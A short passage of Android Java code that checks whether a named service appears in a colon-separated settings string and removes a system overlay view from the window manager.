            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
            splitter.setString(prefStr);
            while (splitter.hasNext()) {
                String s = splitter.next();
                if (s.equalsIgnoreCase(serviceName)) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private void removeSystemOverlay() {
        if (overlayView != null && windowMgr != null) {
            try { windowMgr.removeView(overlayView); } catch (Exception e) {}
            overlayView = null;
        }
    }
}
